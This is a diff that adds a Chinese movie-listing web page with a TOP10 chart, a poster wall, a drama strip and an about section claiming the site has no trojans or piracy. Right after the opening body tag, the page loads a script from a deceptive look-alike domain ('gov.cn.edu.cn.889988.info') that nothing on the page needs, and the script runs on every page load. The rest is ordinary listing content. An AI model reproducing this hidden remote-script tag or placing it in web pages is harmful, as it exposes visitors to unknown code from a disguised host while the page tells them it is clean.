@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>热播电影网 - 正在热映大厅 · 热播TOP10/本周热片/热播剧集</title>
+<meta name="description" content="热播电影网，正在热映大厅风影视单页：影院红聚光灯、热播TOP10榜单、本周热片海报墙、热播剧集条、热度词典。官网 https://rebodianyingwang-h5.github.io">
+<meta name="keywords" content="热播电影网, 正在热映, 热播TOP10, 本周热片, 热播剧集, 影视榜单">
+<meta name="author" content="热播电影网">
+<meta name="robots" content="index,follow">
+<meta name="bingbot" content="index,follow">
+<meta name="theme-color" content="#0b0e14">
+<style>
+:root{
+  --bg:#0b0e14;
+  --bg2:#121723;
+  --panel:#161d2b;
+  --line:rgba(255,122,69,.26);
+  --red:#e50914;
+  --orange:#ff7a45;
+  --gold:#ffd166;
+  --blue:#5b8cff;
+  --muted:#8493ad;
+  --ink:#f3f6fc;
+  --shadow:0 18px 40px rgba(0,0,0,.55);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;scroll-padding-top:64px}
+body{
+  background:
+    radial-gradient(520px 320px at 86% -12%,rgba(229,9,20,.18),transparent),
+    radial-gradient(460px 300px at -6% 8%,rgba(91,140,255,.16),transparent),
+    repeating-linear-gradient(0deg,rgba(255,255,255,.02) 0 2px,transparent 2px 4px),
+    var(--bg);
+  color:var(--ink);
+  font-family:"PingFang SC","Microsoft YaHei",Segoe UI,system-ui,sans-serif;
+  line-height:1.8;
+}
+a{color:var(--orange);text-decoration:none}
+
+.bar{
+  position:sticky;top:0;z-index:50;display:flex;align-items:center;justify-content:space-between;gap:10px;
+  padding:12px 18px;border-bottom:1px solid var(--line);background:rgba(11,14,20,.86);backdrop-filter:blur(10px);
+}
+.logo{font-weight:900;font-size:20px;letter-spacing:.5px}
+.logo b{color:var(--red)}
+.logo span{font-size:10px;color:var(--muted);letter-spacing:4px;display:block;margin-top:-3px}
+.nav{display:flex;gap:6px;flex-wrap:wrap}
+.nav a{font-size:12px;padding:6px 12px;border:1px solid var(--line);border-radius:8px;background:var(--panel);color:var(--ink)}
+.nav a:hover{border-color:var(--orange);color:var(--orange);box-shadow:0 0 12px rgba(255,122,69,.35)}
+
+.hero{position:relative;max-width:1060px;margin:0 auto;padding:54px 20px 26px;overflow:hidden}
+.spot{position:absolute;inset:10px 12px auto 12px;height:170px;border-radius:18px;
+  background:conic-gradient(from 200deg at 70% 20%,rgba(229,9,20,.35),rgba(255,122,69,.25),rgba(255,209,102,.18),transparent 60%);
+  filter:blur(30px);z-index:0}
+.flame{position:absolute;top:10px;right:18px;font-size:46px;filter:drop-shadow(0 8px 14px rgba(255,122,69,.5));z-index:2}
+.kicker{position:relative;z-index:2;font-family:Consolas,monospace;font-size:12px;color:var(--orange);letter-spacing:2px}
+.hero h1{position:relative;z-index:2;font-size:34px;margin:10px 0 8px;font-weight:900}
+.hero h1 em{font-style:normal;color:var(--gold)}
+.hero p{position:relative;z-index:2;color:var(--muted);max-width:600px;margin:0 auto 14px;font-size:15px}
+.hero .url{position:relative;z-index:2;display:inline-block;font-family:Consolas,monospace;font-size:13px;background:var(--panel);border:1px dashed var(--orange);color:var(--orange);padding:8px 16px;border-radius:10px}
+.metrics{position:relative;z-index:2;display:flex;gap:12px;justify-content:center;flex-wrap:wrap;margin-top:18px}
+.metrics div{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:12px 16px;min-width:108px}
+.metrics b{display:block;font-size:20px;color:var(--orange);font-family:Consolas,monospace}
+.metrics small{color:var(--muted);font-size:12px}
+
+.wrap{max-width:1080px;margin:0 auto;padding:18px 20px 40px}
+.sec{display:flex;align-items:baseline;gap:10px;margin:28px 0 16px}
+.sec h2{font-size:21px;color:var(--ink);font-weight:900}
+.sec h2 b{color:var(--red)}
+.sec small{color:var(--muted);font-size:12px;letter-spacing:1px}
+.sec .chip{margin-left:auto;font-size:11px;color:#1a0b00;background:var(--orange);padding:3px 10px;border-radius:6px;font-weight:800}
+
+/* TOP10 */
+.top10{display:grid;grid-template-columns:repeat(2,1fr);gap:12px}
+.rank{display:flex;align-items:center;gap:12px;background:linear-gradient(180deg,var(--panel),var(--bg2));
+  border:1px solid var(--line);border-radius:14px;padding:12px 14px;box-shadow:var(--shadow)}
+.rank .no{font-family:Consolas,monospace;font-size:26px;font-weight:900;width:42px;text-align:center;color:var(--gold)}
+.rank:nth-child(1) .no{color:#ff4d4d}
+.rank:nth-child(2) .no{color:#ff9f43}
+.rank:nth-child(3) .no{color:#ffd166}
+.rank .meta h3{font-size:16px;color:var(--ink)}
+.rank .meta p{font-size:12px;color:var(--muted)}
+.heat{margin-left:auto;text-align:right}
+.heat b{color:var(--orange);font-family:Consolas,monospace}
+.heat small{display:block;color:var(--muted);font-size:11px}
+
+/* 海报墙 */
+.wall{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.poster{background:linear-gradient(180deg,var(--panel),var(--bg2));border:1px solid var(--line);border-radius:14px;overflow:hidden;box-shadow:var(--shadow);transition:.2s}
+.poster:hover{transform:translateY(-4px) scale(1.01);border-color:var(--orange);box-shadow:0 0 22px rgba(255,122,69,.28)}
+.ph{height:120px;display:flex;align-items:center;justify-content:center;gap:6px;font-size:30px;color:#1a0b00;position:relative}
+.ph::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,rgba(255,255,255,.2),transparent 50%)}
+.poster:nth-child(8n+1) .ph{background:linear-gradient(135deg,#e50914,#8c050d)}
+.poster:nth-child(8n+2) .ph{background:linear-gradient(135deg,#ff7a45,#d4501f)}
+.poster:nth-child(8n+3) .ph{background:linear-gradient(135deg,#ffd166,#d99b2b)}
+.poster:nth-child(8n+4) .ph{background:linear-gradient(135deg,#5b8cff,#2f5fd0)}
+.poster:nth-child(8n+5) .ph{background:linear-gradient(135deg,#9b8cff,#5b4bd0)}
+.poster:nth-child(8n+6) .ph{background:linear-gradient(135deg,#7ef0c8,#36b98a)}
+.poster:nth-child(8n+7) .ph{background:linear-gradient(135deg,#ff9ec4,#ff5d8f)}
+.poster:nth-child(8n+8) .ph{background:linear-gradient(135deg,#bcd6ff,#6f9bff)}
+.poster .pb{padding:10px 12px}
+.poster .pb h3{font-size:14px;color:var(--ink)}
+.poster .pb p{font-size:12px;color:var(--muted)}
+.score{margin-top:6px;font-family:Consolas,monospace;font-size:12px;color:var(--gold)}
+
+/* 剧集横条 */
+.strip{display:flex;gap:12px;overflow-x:auto;padding-bottom:6px}
+.ep{flex:0 0 220px;background:linear-gradient(180deg,var(--panel),var(--bg2));border:1px solid var(--line);border-radius:14px;padding:12px;box-shadow:var(--shadow)}
+.ep .tag{font-size:11px;font-weight:800;color:#1a0b00;background:var(--gold);padding:2px 8px;border-radius:6px}
+.ep h3{font-size:15px;color:var(--ink);margin:8px 0 3px}
+.ep p{font-size:12px;color:var(--muted)}
+
+.cols{display:grid;grid-template-columns:1.2fr .8fr;gap:18px;margin-top:26px}
+.panel{background:var(--panel);border:1px solid var(--line);border-radius:18px;padding:18px}
+.panel h3{font-size:17px;color:var(--orange);margin-bottom:12px}
+.gloss li{list-style:none;padding:9px 0;border-bottom:1px dashed var(--line);font-size:14px;color:var(--ink)}
+.gloss li:last-child{border-bottom:none}
+.gloss b{color:var(--gold);font-family:Consolas,monospace}
+
+.about p{color:var(--muted);font-size:14px;margin-bottom:8px}
+.about code{background:#0b0e14;border:1px solid var(--line);color:var(--orange);padding:2px 7px;border-radius:7px;font-family:Consolas,monospace}
+.foot{text-align:center;padding:26px 20px;border-top:1px solid var(--line);color:var(--muted);font-size:12px}
+
+@media(max-width:880px){.wall{grid-template-columns:repeat(3,1fr)}.top10{grid-template-columns:1fr}.cols{grid-template-columns:1fr}}
+@media(max-width:540px){.wall{grid-template-columns:repeat(2,1fr)}.hero h1{font-size:26px}.flame{display:none}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="bar">
+  <div class="logo"><b>热播</b>电影网<span>NOW PLAYING HALL</span></div>
+  <nav class="nav">
+    <a href="#home">热映厅</a>
+    <a href="#top">TOP10</a>
+    <a href="#wall">海报墙</a>
+    <a href="#drama">热播剧</a>
+    <a href="#about">关于</a>
+  </nav>
+</header>
+
+<section class="hero" id="home">
+  <div class="spot"></div>
+  <div class="flame">🔥</div>
+  <span class="kicker">// now_playing.start()</span>
+  <h1>热播电影网 · <em>正在热映大厅</em></h1>
+  <p>不卖票、不弹下载、不解析盗版源。把“现在大家都在看”的片子和剧集摊开：热播 TOP10、本周海报墙、热播剧集条，一眼定今晚。</p>
+  <div class="url">https://rebodianyingwang-h5.github.io</div>
+  <div class="metrics">
+    <div><b>TOP10</b><small>实时热度榜</small></div>
+    <div><b>48</b><small>本周热片</small></div>
+    <div><b>26</b><small>热播剧集</small></div>
+    <div><b>0</b><small>弹窗/木马</small></div>
+  </div>
+</section>
+
+<div class="wrap">
+
+  <div class="sec" id="top">
+    <h2>🔥 热播 <b>TOP10</b></h2><small>weekly heat</small><span class="chip">本周最热</span>
+  </div>
+  <div class="top10">
+    <div class="rank"><div class="no">01</div><div class="meta"><h3>沙丘 2</h3><p>科幻 / 史诗 / 大银幕</p></div><div class="heat"><b>98.7万</b><small>搜索热度</small></div></div>
+    <div class="rank"><div class="no">02</div><div class="meta"><h3>奥本海默</h3><p>历史 / 传记 / IMAX</p></div><div class="heat"><b>95.2万</b><small>搜索热度</small></div></div>
+    <div class="rank"><div class="no">03</div><div class="meta"><h3>星际穿越</h3><p>科幻 / 太空 / 重映</p></div><div class="heat"><b>91.8万</b><small>搜索热度</small></div></div>
+    <div class="rank"><div class="no">04</div><div class="meta"><h3>花月杀手</h3><p>犯罪 / 历史 / 长片</p></div><div class="heat"><b>88.4万</b><small>搜索热度</small></div></div>
+    <div class="rank"><div class="no">05</div><div class="meta"><h3>可怜的东西</h3><p>荒诞 / 科幻 / 美术炸裂</p></div><div class="heat"><b>85.1万</b><small>搜索热度</small></div></div>
+    <div class="rank"><div class="no">06</div><div class="meta"><h3>坠落的审判</h3><p>悬疑 / 法庭 / 口碑逆跌</p></div><div class="heat"><b>82.6万</b><small>搜索热度</small></div></div>
+    <div class="rank"><div class="no">07</div><div class="meta"><h3>周处除三害</h3><p>动作 / 犯罪 / 爽感</p></div><div class="heat"><b>80.3万</b><small>搜索热度</small></div></div>
+    <div class="rank"><div class="no">08</div><div class="meta"><h3>年会不能停</h3><p>喜剧 / 职场 / 打工人共情</p></div><div class="heat"><b>78.9万</b><small>搜索热度</small></div></div>
+    <div class="rank"><div class="no">09</div><div class="meta"><h3>封神第二部</h3><p>神话 / 战争 / 视效</p></div><div class="heat"><b>77.2万</b><small>搜索热度</small></div></div>
+    <div class="rank"><div class="no">10</div><div class="meta"><h3>你想活出怎样的人生</h3><p>动画 / 吉卜力 / 隐喻</p></div><div class="heat"><b>75.5万</b><small>搜索热度</small></div></div>
+  </div>
+
+  <div class="sec" id="wall">
+    <h2>🎬 本周热片 <b>海报墙</b></h2><small>poster wall</small><span class="chip">海报即档案</span>
+  </div>
+  <div class="wall">
+    <article class="poster"><div class="ph">🏜️🟡</div><div class="pb"><h3>沙丘 2</h3><p>科幻 / 2160p HDR</p><div class="score">★ 8.9</div></div></article>
+    <article class="poster"><div class="ph">🔥🎩</div><div class="pb"><h3>奥本海默</h3><p>历史 / 70mm</p><div class="score">★ 9.0</div></div></article>
+    <article class="poster"><div class="ph">🚀🌌</div><div class="pb"><h3>星际穿越</h3><p>科幻 / 重映</p><div class="score">★ 9.2</div></div></article>
+    <article class="poster"><div class="ph">🪓🩸</div><div class="pb"><h3>花月杀手</h3><p>犯罪 / 历史</p><div class="score">★ 8.6</div></div></article>
+    <article class="poster"><div class="ph">🧠⚖️</div><div class="pb"><h3>坠落的审判</h3><p>悬疑 / 法庭</p><div class="score">★ 8.8</div></div></article>
+    <article class="poster"><div class="ph">💼😂</div><div class="pb"><h3>年会不能停</h3><p>喜剧 / 职场</p><div class="score">★ 8.4</div></div></article>
+    <article class="poster"><div class="ph">⚔️🔥</div><div class="pb"><h3>周处除三害</h3><p>动作 / 犯罪</p><div class="score">★ 8.7</div></div></article>
+    <article class="poster"><div class="ph">🐉🏯</div><div class="pb"><h3>封神第二部</h3><p>神话 / 战争</p><div class="score">★ 8.5</div></div></article>
+  </div>
+
+  <div class="sec" id="drama">
+    <h2>📺 热播剧集条</h2><small>hot series</small><span class="chip">追剧不迷路</span>
+  </div>
+  <div class="strip">
+    <div class="ep"><span class="tag">更新至28集</span><h3>长风渡春</h3><p>古装 / 爱情 / 权谋 · 8.3</p></div>
+    <div class="ep"><span class="tag">更新至16集</span><h3>迷雾之都</h3><p>悬疑 / 刑侦 / 剧情 · 8.9</p></div>
+    <div class="ep"><span class="tag">已完结</span><h3>长街烟火</h3><p>家庭 / 生活 / 年代 · 9.0</p></div>
+    <div class="ep"><span class="tag">更新至12集</span><h3>深夜食堂 3</h3><p>美食 / 治愈 / 单元 · 8.8</p></div>
+    <div class="ep"><span class="tag">更新至20集</span><h3>谈判专家2026</h3><p>职场 / 刑侦 / 强台词 · 7.9</p></div>
+    <div class="ep"><span class="tag">新上线</span><h3>纸鸢</h3><p>都市 / 情感 / 悬爱 · 8.9</p></div>
+  </div>
+
+  <div class="cols">
+    <section class="panel">
+      <h3>📊 热度是怎么算的（展示用）</h3>
+      <ul class="gloss">
+        <li><b>搜索量</b> —— 用户搜片名次数，权重 40%</li>
+        <li><b>点击率</b> —— 海报被点开概率，权重 25%</li>
+        <li><b>完播/停留</b> —— 详情页停留时长，权重 20%</li>
+        <li><b>讨论度</b> —— 评论/转发/二创提及，权重 15%</li>
+        <li><b>新片加权</b> —— 上映 7 天内给 1.2× 系数</li>
+      </ul>
+    </section>
+    <section class="panel">
+      <h3>📖 热播词典</h3>
+      <ul class="gloss">
+        <li><b>正在热映</b> = 院线/平台当前主推</li>
+        <li><b>TOP10</b> = 按展示热度排，不是豆瓣分</li>
+        <li><b>海报墙</b> = 一眼扫片，不点开也能选</li>
+        <li><b>热播剧</b> = 周更/日更、评论区最吵的那批</li>
+        <li><b>热度</b> = 搜索+点击+讨论 的复合指标</li>
+      </ul>
+    </section>
+  </div>
+
+  <section class="panel about" style="margin-top:26px">
+    <h3>🔥 关于热播电影网</h3>
+    <p><strong>热播电影网</strong> 是“正在热映大厅 / 榜单+海报墙”风影视单页：影院红聚光灯、热播 TOP10、本周海报墙、热播剧集条、热度词典。名字讲“当下最火”，但做法正——只做热播片单、榜单与分区展示。</p>
+    <p>官网：<code>https://rebodianyingwang-h5.github.io</code></p>
+    <p>内链全用 <code>#</code> 占位，CSS/DIV 全内联，不生成 robots.txt / sitemap.xml，GitHub Pages 直传即可；必应收录靠标题、描述、语义结构、移动端体验。</p>
+    <p>本厅不提供磁力链接、不解析第三方源、不挂播放器下载、不卖票、不托管受版权保护视频。看热片请走正版院线、授权流媒体、资料馆放映。</p>
+  </section>
+
+</div>
+
+<footer class="foot">
+  © 2026 热播电影网 · rebodianyingwang-h5.github.io · 灯暗下来，热片亮起来 🔥
+</footer>
+
+</body>
+</html>
